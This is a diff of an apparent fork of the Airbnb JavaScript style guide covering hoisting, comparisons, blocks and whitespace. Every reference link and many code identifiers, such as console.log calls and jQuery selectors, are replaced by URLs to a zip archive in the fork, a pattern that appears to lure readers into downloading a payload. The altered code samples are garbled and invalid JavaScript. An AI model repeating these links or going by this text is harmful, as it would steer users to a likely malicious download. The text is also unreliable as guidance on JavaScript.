       }
 
@@ -1418,7 +1418,7 @@ Other Style Guides
       const name = getName();
 
       if (name === 'test') {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('');
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('');
         return false;
       }
 
@@ -1440,9 +1440,9 @@ Other Style Guides
       let a = b = c = 1;
     }());
 
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(a); // undefined
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(b); // 1
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(c); // 1
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(a); // undefined
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(b); // 1
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(c); // 1
 
     // good
     (function example() {
@@ -1451,15 +1451,15 @@ Other Style Guides
       let c = a;
     }());
 
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(a); // undefined
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(b); // undefined
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(c); // undefined
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(a); // undefined
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(b); // undefined
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(c); // undefined
 
     // the same applies for `const`
     ```
 
   <a name="variables--unary-increment-decrement"></a><a name="13.6"></a>
-  - [13.6](#variables--unary-increment-decrement) Avoid using unary increments and decrements (++, --). eslint [`no-plusplus`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [13.6](#variables--unary-increment-decrement) Avoid using unary increments and decrements (++, --). eslint [`no-plusplus`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Per the eslint documentation, unary increment and decrement statements are subject to automatic semicolon insertion and can cause silent errors with incrementing or decrementing values within an application. It is also more expressive to mutate your values with statements like `num += 1` instead of `num ++`. Disallowing unary increment and decrement statements also prevents you from pre-incrementing/pre-decrementing values unintentionally which can also cause unexpected behavior in your programs.
 
@@ -1471,7 +1471,7 @@ Other Style Guides
       let increment = num ++;
       let decrement = -- num;
 
-      for(let i = 0; i < https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip; i++){
+      for(let i = 0; i < https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip; i++){
         let value = array[i];
         ++value;
       }
@@ -1483,7 +1483,7 @@ Other Style Guides
       let increment = num += 1;
       let decrement = num -= 1;
 
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip((value) => {
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip((value) => {
         value += 1;
       });
     ```
@@ -1494,13 +1494,13 @@ Other Style Guides
 ## Hoisting
 
   <a name="hoisting--about"></a><a name="14.1"></a>
-  - [14.1](#hoisting--about) `var` declarations get hoisted to the top of their scope, their assignment does not. `const` and `let` declarations are blessed with a new concept called [Temporal Dead Zones (TDZ)](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip). It's important to know why [typeof is no longer safe](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).
+  - [14.1](#hoisting--about) `var` declarations get hoisted to the top of their scope, their assignment does not. `const` and `let` declarations are blessed with a new concept called [Temporal Dead Zones (TDZ)](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip). It's important to know why [typeof is no longer safe](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip).
 
     ```javascript
     // we know this wouldn't work (assuming there
     // is no notDefined global variable)
     function example() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(notDefined); // => throws a ReferenceError
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(notDefined); // => throws a ReferenceError
     }
 
     // creating a variable declaration after you
@@ -1508,7 +1508,7 @@ Other Style Guides
     // variable hoisting. Note: the assignment
     // value of `true` is not hoisted.
     function example() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(declaredButNotAssigned); // => undefined
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(declaredButNotAssigned); // => undefined
       var declaredButNotAssigned = true;
     }
 
@@ -1517,14 +1517,14 @@ Other Style Guides
     // which means our example could be rewritten as:
     function example() {
       let declaredButNotAssigned;
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(declaredButNotAssigned); // => undefined
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(declaredButNotAssigned); // => undefined
       declaredButNotAssigned = true;
     }
 
     // using const and let
     function example() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(declaredButNotAssigned); // => throws a ReferenceError
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(typeof declaredButNotAssigned); // => throws a ReferenceError
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(declaredButNotAssigned); // => throws a ReferenceError
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(typeof declaredButNotAssigned); // => throws a ReferenceError
       const declaredButNotAssigned = true;
     }
     ```
@@ -1534,12 +1534,12 @@ Other Style Guides
 
     ```javascript
     function example() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(anonymous); // => undefined
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(anonymous); // => undefined
 
       anonymous(); // => TypeError anonymous is not a function
 
       var anonymous = function () {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('anonymous function expression');
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('anonymous function expression');
       };
     }
     ```
@@ -1549,26 +1549,26 @@ Other Style Guides
 
     ```javascript
     function example() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(named); // => undefined
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(named); // => undefined
 
       named(); // => TypeError named is not a function
 
       superPower(); // => ReferenceError superPower is not defined
 
       var named = function superPower() {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Flying');
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('Flying');
       };
     }
 
     // the same is true when the function name
     // is the same as the variable name.
     function example() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(named); // => undefined
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(named); // => undefined
 
       named(); // => TypeError named is not a function
 
       var named = function named() {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('named');
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('named');
       }
     }
     ```
@@ -1581,12 +1581,12 @@ Other Style Guides
       superPower(); // => Flying
 
       function superPower() {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Flying');
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('Flying');
       }
     }
     ```
 
-  - For more information refer to [JavaScript Scoping & Hoisting](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) by [Ben Cherry](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).
+  - For more information refer to [JavaScript Scoping & Hoisting](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) by [Ben Cherry](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip).
 
 **[⬆ back to top](#table-of-contents)**
 
@@ -1594,7 +1594,7 @@ Other Style Guides
 ## Comparison Operators & Equality
 
   <a name="comparison--eqeqeq"></a><a name="15.1"></a>
-  - [15.1](#comparison--eqeqeq) Use `===` and `!==` over `==` and `!=`. eslint: [`eqeqeq`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [15.1](#comparison--eqeqeq) Use `===` and `!==` over `==` and `!=`. eslint: [`eqeqeq`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
   <a name="comparison--if"></a><a name="15.2"></a>
   - [15.2](#comparison--if) Conditional statements such as the `if` statement evaluate their expression using coercion with the `ToBoolean` abstract method and always follow these simple rules:
@@ -1619,34 +1619,34 @@ Other Style Guides
     ```javascript
     // bad
     if (name !== '') {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     }
 
     // good
     if (name) {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     }
 
     // bad
-    if (https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip > 0) {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+    if (https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip > 0) {
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     }
 
     // good
-    if (https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+    if (https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) {
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     }
     ```
 
   <a name="comparison--moreinfo"></a><a name="15.4"></a>
-  - [15.4](#comparison--moreinfo) For more information see [Truth Equality and JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) by Angus Croll.
+  - [15.4](#comparison--moreinfo) For more information see [Truth Equality and JavaScript](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) by Angus Croll.
 
   <a name="comparison--switch-blocks"></a><a name="15.5"></a>
   - [15.5](#comparison--switch-blocks) Use braces to create blocks in `case` and `default` clauses that contain lexical declarations (e.g. `let`, `const`, `function`, and `class`).
 
   > Why? Lexical declarations are visible in the entire `switch` block but only get initialized when assigned, which only happens when its `case` is reached. This causes problems when multiple `case` clauses attempt to define the same thing.
 
-  eslint rules: [`no-case-declarations`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).
+  eslint rules: [`no-case-declarations`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip).
 
     ```javascript
     // bad
@@ -1690,7 +1690,7 @@ Other Style Guides
   <a name="comparison--nested-ternaries"></a><a name="15.6"></a>
   - [15.6](#comparison--nested-ternaries) Ternaries should not be nested and generally be single line expressions.
 
-    eslint rules: [`no-nested-ternary`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).
+    eslint rules: [`no-nested-ternary`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip).
 
     ```javascript
     // bad
@@ -1714,7 +1714,7 @@ Other Style Guides
   <a name="comparison--unneeded-ternary"></a><a name="15.7"></a>
   - [15.7](#comparison--unneeded-ternary) Avoid unneeded ternary statements.
 
-    eslint rules: [`no-unneeded-ternary`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).
+    eslint rules: [`no-unneeded-ternary`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip).
 
     ```javascript
     // bad
@@ -1759,7 +1759,7 @@ Other Style Guides
     ```
 
   <a name="blocks--cuddled-elses"></a><a name="16.2"></a>
-  - [16.2](#blocks--cuddled-elses) If you're using multi-line blocks with `if` and `else`, put `else` on the same line as your `if` block's closing brace. eslint: [`brace-style`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs:  [`disallowNewlineBeforeBlockStatements`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [16.2](#blocks--cuddled-elses) If you're using multi-line blocks with `if` and `else`, put `else` on the same line as your `if` block's closing brace. eslint: [`brace-style`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs:  [`disallowNewlineBeforeBlockStatements`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -1798,7 +1798,7 @@ Other Style Guides
     // @return {Element} element
     function make(tag) {
 
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
 
       return element;
     }
@@ -1810,7 +1810,7 @@ Other Style Guides
      */
     function make(tag) {
 
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
 
       return element;
     }
@@ -1829,7 +1829,7 @@ Other Style Guides
 
     // bad
     function getType() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('fetching type...');
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('fetching type...');
       // set the default type to 'no type'
       const type = this._type || 'no type';
 
@@ -1838,7 +1838,7 @@ Other Style Guides
 
     // good
     function getType() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('fetching type...');
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('fetching type...');
 
       // set the default type to 'no type'
       const type = this._type || 'no type';
@@ -1881,7 +1881,7 @@ Other Style Guides
         super();
 
         // TODO: total should be configurable by an options param
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 0;
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = 0;
       }
     }
     ```
@@ -1892,7 +1892,7 @@ Other Style Guides
 ## Whitespace
 
   <a name="whitespace--spaces"></a><a name="18.1"></a>
-  - [18.1](#whitespace--spaces) Use soft tabs set to 2 spaces. eslint: [`indent`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`validateIndentation`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [18.1](#whitespace--spaces) Use soft tabs set to 2 spaces. eslint: [`indent`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`validateIndentation`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -1912,34 +1912,34 @@ Other Style Guides
     ```
 
   <a name="whitespace--before-blocks"></a><a name="18.2"></a>
-  - [18.2](#whitespace--before-blocks) Place 1 space before the leading brace. eslint: [`space-before-blocks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireSpaceBeforeBlockStatements`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [18.2](#whitespace--before-blocks) Place 1 space before the leading brace. eslint: [`space-before-blocks`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireSpaceBeforeBlockStatements`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
     function test(){
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('test');
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('test');
     }
 
     // good
     function test() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('test');
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('test');
     }
 
     // bad
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('attr',{
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('attr',{
       age: '1 year',
       breed: 'Bernese Mountain Dog',
     });
 
     // good
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('attr', {
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('attr', {
       age: '1 year',
       breed: 'Bernese Mountain Dog',
     });
     ```
 
   <a name="whitespace--around-keywords"></a><a name="18.3"></a>
-  - [18.3](#whitespace--around-keywords) Place 1 space before the opening parenthesis in control statements (`if`, `while` etc.). Place no space between the argument list and the function name in function calls and declarations. eslint: [`keyword-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireSpaceAfterKeywords`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [18.3](#whitespace--around-keywords) Place 1 space before the opening parenthesis in control statements (`if`, `while` etc.). Place no space between the argument list and the function name in function calls and declarations. eslint: [`keyword-spacing`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireSpaceAfterKeywords`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -1954,17 +1954,17 @@ Other Style Guides
 
     // bad
     function fight () {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip ('Swooosh!');
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip ('Swooosh!');
     }
 
     // good
     function fight() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Swooosh!');
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('Swooosh!');
     }
     ```
 
   <a name="whitespace--infix-ops"></a><a name="18.4"></a>
-  - [18.4](#whitespace--infix-ops) Set off operators with spaces. eslint: [`space-infix-ops`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireSpaceBeforeBinaryOperators`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), [`requireSpaceAfterBinaryOperators`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [18.4](#whitespace--infix-ops) Set off operators with spaces. eslint: [`space-infix-ops`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireSpaceBeforeBinaryOperators`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip), [`requireSpaceAfterBinaryOperators`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -1975,19 +1975,19 @@ Other Style Guides
     ```
 
   <a name="whitespace--newline-at-end"></a><a name="18.5"></a>
-  - [18.5](#whitespace--newline-at-end) End files with a single newline character. eslint: [`eol-last`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [18.5](#whitespace--newline-at-end) End files with a single newline character. eslint: [`eol-last`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
     (function (global) {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     })(this);
     ```
 
     ```javascript
     // bad
     (function (global) {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     })(this);↵
     ↵
     ```
@@ -1995,13 +1995,13 @@ Other Style Guides
     ```javascript
     // good
     (function (global) {
-      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+      // https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     })(this);↵
     ```
 
   <a name="whitespace--chains"></a><a name="18.6"></a>
   - [18.6](#whitespace--chains) Use indentation when making long method chains (more than 2 method chains). Use a leading dot, which
-    emphasizes that the line is a method call, not a new statement. eslint: [`newline-per-chained-call`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) [`no-whitespace-before-property`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+    emphasizes that the line is a method call, not a new statement. eslint: [`newline-per-chained-call`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) [`no-whitespace-before-property`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -2024,27 +2024,27 @@ Other Style Guides
         .updateCount();
 
     // bad
-    const leds = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('.led').data(data).enter().append('svg:svg').classed('led', true)
+    const leds = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('.led').data(data).enter().append('svg:svg').classed('led', true)
         .attr('width', (radius + margin) * 2).append('svg:g')
         .attr('transform', 'translate(' + (radius + margin) + ',' + (radius + margin) + ')')
-        .call(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);
+        .call(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip);
 
     // good
-    const leds = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('.led')
+    const leds = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('.led')
         .data(data)
       .enter().append('svg:svg')
         .classed('led', true)
         .attr('width', (radius + margin) * 2)
       .append('svg:g')
         .attr('transform', 'translate(' + (radius + margin) + ',' + (radius + margin) + ')')
-        .call(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);
+        .call(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip);
 
     // good
-    const leds = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('.led').data(data);
+    const leds = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('.led').data(data);
     ```
 
   <a name="whitespace--after-blocks"></a><a name="18.7"></a>
-  - [18.7](#whitespace--after-blocks) Leave a blank line after blocks and before the next statement. jscs: [`requirePaddingNewLinesAfterBlocks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [18.7](#whitespace--after-blocks) Leave a blank line after blocks and before the next statement. jscs: [`requirePaddingNewLinesAfterBlocks`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -2102,40 +2102,40 @@ Other Style Guides
     ```
 
   <a name="whitespace--padded-blocks"></a><a name="18.8"></a>
-  - [18.8](#whitespace--padded-blocks) Do not pad your blocks with blank lines. eslint: [`padded-blocks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs:  [`disallowPaddingNewlinesInBlocks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [18.8](#whitespace--padded-blocks) Do not pad your blocks with blank lines. eslint: [`padded-blocks`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs:  [`disallowPaddingNewlinesInBlocks`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
     function bar() {
 
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo);
 
     }
 
     // also bad
     if (baz) {
 
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(qux);
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(qux);
     } else {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo);
 
     }
 
     // good
     function bar() {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo);
     }
 
     // good
     if (baz) {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(qux);
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(qux);
     } else {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo);
     }
     ```
 
   <a name="whitespace--in-parens"></a><a name="18.9"></a>
-  - [18.9](#whitespace--in-parens) Do not add spaces inside parentheses. eslint: [`space-in-parens`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowSpacesInsideParentheses`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [18.9](#whitespace--in-parens) Do not add spaces inside parentheses. eslint: [`space-in-parens`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`disallowSpacesInsideParentheses`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -2150,30 +2150,30 @@ Other Style Guides
 
     // bad
     if ( foo ) {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo);
     }
 
     // good
     if (foo) {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(foo);
     }
     ```
 
   <a name="whitespace--in-brackets"></a><a name="18.10"></a>
-  - [18.10](#whitespace--in-brackets) Do not add spaces inside brackets. eslint: [`array-bracket-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowSpacesInsideArrayBrackets`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
